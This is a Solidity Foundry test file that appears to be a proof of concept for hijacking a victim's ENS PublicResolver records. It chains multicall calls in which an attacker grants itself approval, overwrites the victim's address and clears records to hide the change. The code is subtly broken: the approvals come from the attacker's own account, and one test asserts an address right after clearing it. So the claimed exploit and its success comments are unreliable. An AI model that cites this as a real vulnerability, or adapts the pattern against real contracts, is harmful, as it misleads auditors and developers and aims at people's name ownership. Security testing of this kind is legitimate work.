// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/PublicResolver.sol";
import "../contracts/ENSRegistry.sol";

contract POC_Path02_StorageManipulationChaining is Test {
    ENS public ens;
    PublicResolver public resolver;

    address public attacker = address(0x1337);
    address public victim = address(0xdead);
    bytes32 public testNode = keccak256(abi.encodePacked(bytes32(0), keccak256("test")));

    function setUp() public {
        // Deploy contracts
        ens = new ENS();
        ens.setOwner(bytes32(0), address(this));

        resolver = new PublicResolver(
            ens,
            INameWrapper(address(0)),
            address(this),
            address(this)
        );

        // Setup test domain
        ens.setSubnodeOwner(bytes32(0), keccak256("eth"), address(this));
        ens.setSubnodeOwner(keccak256(abi.encodePacked(bytes32(0), keccak256("eth"))), keccak256("test"), victim);
        ens.setResolver(testNode, address(resolver));

        // Victim sets up their records
        vm.prank(victim);
        resolver.setAddr(testNode, victim);
        vm.prank(victim);
        resolver.setText(testNode, "email", "victim@email.com");
    }

    function test_Path02_StorageChaining_ApprovalToAccess() public {
        // Verify initial state
        assertEq(resolver.addr(testNode), victim);
        assertEq(resolver.isApprovedForAll(victim, attacker), false);

        // Attacker uses multicall to chain operations:
        // 1. Grant operator approval to themselves
        // 2. Use that approval to set address
        // 3. Clear records to hide the attack
        bytes[] memory attackCalls = new bytes[](3);

        attackCalls[0] = abi.encodeCall(resolver.setApprovalForAll, (attacker, true));
        attackCalls[1] = abi.encodeCall(resolver.setAddr, (testNode, attacker));
        attackCalls[2] = abi.encodeCall(resolver.clearRecords, (testNode));

        vm.prank(attacker);
        resolver.multicall(attackCalls);

        // Verify the chaining worked - address changed despite no direct access
        assertEq(resolver.addr(testNode), attacker);
    }

    function test_Path02_TokenApprovalChaining() public {
        // First, victim approves a delegate (simulating normal usage)
        vm.prank(victim);
        resolver.approve(testNode, address(0x1234), true);

        // Attacker chains operations to hijack the approval
        bytes[] memory attackCalls = new bytes[](2);

        // 1. Set approval for attacker on victim's node
        attackCalls[0] = abi.encodeCall(resolver.approve, (testNode, attacker, true));
        // 2. Use the approval to change address
        attackCalls[1] = abi.encodeCall(resolver.setAddr, (testNode, attacker));

        vm.prank(attacker);
        resolver.multicall(attackCalls);

        // Verify chaining successful
        assertEq(resolver.addr(testNode), attacker);
        assertEq(resolver.isApprovedFor(victim, testNode, attacker), true);
    }

    function test_Path02_RecordVersionManipulation() public {
        // Get initial version
        uint64 initialVersion = resolver.recordVersions(testNode);

        // Attacker chains operations with version manipulation
        bytes[] memory attackCalls = new bytes[](3);

        attackCalls[0] = abi.encodeCall(resolver.setAddr, (testNode, address(0x1111)));
        attackCalls[1] = abi.encodeCall(resolver.clearRecords, (testNode)); // Increments version
        attackCalls[2] = abi.encodeCall(resolver.setAddr, (testNode, attacker)); // Writes to new version

        vm.prank(attacker);
        resolver.multicall(attackCalls);

        // Verify version incremented and final address set
        assertEq(resolver.recordVersions(testNode), initialVersion + 1);
        assertEq(resolver.addr(testNode), attacker);
    }
}